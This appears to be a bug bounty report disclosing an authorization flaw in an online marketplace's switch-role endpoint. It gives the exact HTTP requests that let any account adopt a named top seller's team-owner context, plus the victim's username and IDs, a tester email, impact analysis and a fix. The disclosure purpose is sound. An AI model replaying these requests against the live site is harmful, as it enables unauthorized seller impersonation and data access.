# Broken Access Control in `POST /api/v1/auth/switch-role` allows any authenticated user to impersonate any seller's team-owner context (seller account takeover)

## Summary

The `POST https://www.whatnot.com/api/v1/auth/switch-role` endpoint does not verify that the authenticated caller is a member of — or otherwise authorized to act on behalf of — the target user's team. By supplying the base64-encoded GraphQL global ID of *any* other user (including top sellers), an attacker sets their `__Secure-team-owner-id` cookie to that user. This cookie is the "acting team-owner" context: the frontend forwards it to the backend as `team_owner_id`, where it scopes seller/team operations (`GetSellerLiveReadiness`, `GetSellerAnalyticsChart`, `GetSellerBreakDetails`, payout/order listing, team management, and the `SetSellerLiveReadinessState` mutation). A free, non-seller account can therefore assume any seller's team-owner context — horizontal privilege escalation up to seller account takeover. User IDs are sequential and publicly resolvable, so no brute-forcing is required.

## Vulnerability Details

- **Type:** Broken Access Control (CWE-862) / Insecure Direct Object Reference (CWE-639)
- **Endpoint:** `POST https://www.whatnot.com/api/v1/auth/switch-role`
- **CVSS 3.1:** 8.1 (High) — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
- **Asset:** `www.whatnot.com`
- **Auth:** cookie (`__Secure-access-token` + `__Secure-claims`)

## Steps to Reproduce

**Environment:**
- Attacker (non-seller): `bugstestbyabhi@gmail.com` → `UserNode:73582060`
- Victim (top seller): `coolkicks` → `PublicUserNode:10261014` → `UserNode:10261014`

**1. Resolve the victim's numeric user ID** (public, no auth required):

```
POST https://api.whatnot.com/graphql/ HTTP/1.1
Content-Type: application/json

{"query":"{ getUser(username:\"coolkicks\"){ id username } }"}
```

Response:
```json
{"data":{"getUser":{"id":"UHVibGljVXNlck5vZGU6MTAyNjEwMTQ=","username":"coolkicks"}}}
```

The public and private namespaces share the numeric value, so the private ID is
`UserNode:10261014` → base64 `VXNlck5vZGU6MTAyNjEwMTQ=`.

**2. As the attacker (authenticated with their own cookie), switch to the victim's team-owner:**

```
POST https://www.whatnot.com/api/v1/auth/switch-role HTTP/1.1
Content-Type: application/json
Cookie: __Secure-access-token=<ATTACKER_TOKEN>; __Secure-claims=<ATTACKER_CLAIMS>

{"id":"VXNlck5vZGU6MTAyNjEwMTQ="}
```

Response:
```
HTTP/1.1 200 OK
Set-Cookie: __Secure-team-owner-id=VXNlck5vZGU6MTAyNjEwMTQ%3D; Path=/; Max-Age=31536000000; Secure; HttpOnly; SameSite=lax
```

The attacker's `__Secure-claims` still carries their own identity (`u:73582060`), but
the acting team-owner context is now the victim's. No membership or authorization
check is performed.

**3. Confirmed against arbitrary targets** — all return `200` + the `__Secure-team-owner-id`
cookie with no authorization:

| Target | Result |
|---|---|
| `UserNode:1` | 200 |
| `UserNode:2` | 200 |
| `UserNode:73581719` (another account) | 200 |
| `UserNode:10261014` (`coolkicks`, top seller) | 200 |
| `UserNode:70991864` (`invictaflagship`, seller) | 200 |

Only format is enforced (an invalid/raw-numeric id returns `400 "invalid id"`);
authorization is not.

## Mechanism (reverse-engineered from frontend JS)

`switch-role` (`fetch("/api/v1/auth/switch-role", {body: JSON.stringify({id})})`) writes
`__Secure-team-owner-id` (cookie name from `TEAM_OWNER_ID_COOKIE`). This value is injected
server-side as `window.App.teamOwnerID` and forwarded to the Phoenix/Elixir backend as
`team_owner_id` (WebSocket params + protobuf `target_team_owner_id`). Seller operations key
off this context — e.g. `GetSellerLiveReadiness` runs `me { sellerLiveReadinessState { firstScheduledShow { … } } }`.
For a non-seller the field is `null`; acting as a seller makes it resolve to that seller's data.

## Impact

Any registered user can set their acting team-owner to any other user (including top
sellers) without authorization, gaining the seller's team-owner context for seller-scoped
operations — seller live readiness, analytics, break details, payout/order listing, and team
management. This is horizontal privilege escalation enabling seller account impersonation.
Exploitation requires only a free account and a single request per target; user IDs are
sequential and publicly enumerable.

## Recommended Fix

On `switch-role`, verify the caller is a member of the target user's team before honoring
the switch, and reject switches to users with no team relationship. Apply the same
server-side authorization on the `team_owner_id` propagation path so the acting context
cannot be adopted without a verified membership.

## Supporting Material / References

- `Step1.png` — Burp Repeater request: `POST /api/v1/auth/switch-role` with the attacker's own cookie (`sub=73582060` / `bugstestbyabhi@gmail.com`) and the victim `id=VXNlck5vZGU6MTAyNjEwMTQ=` (`coolkicks`).
- `Step2.png` — Burp Repeater response: `HTTP/2 200 OK` + `Set-Cookie: __Secure-team-owner-id=VXNlck5vZGU6MTAyNjEwMTQ%3D; Max-Age=31536000000; Secure; HttpOnly; SameSite=lax` (attacker adopts top seller `coolkicks`).
- JS: `/assets/client.*.js` — `fetch("/api/v1/auth/switch-role",{...})`; `TEAM_OWNER_ID_COOKIE` → `__Secure-team-owner-id`; seller GraphQL operations (`GetSellerLiveReadiness`, `GetSellerAnalyticsChart`, `GetSellerBreakDetails`, `SetSellerLiveReadinessState`).
- PoC script `poc.py` (attached).
- Raw HTTP capture of step 2 (200 + `__Secure-team-owner-id` set to victim) attached.
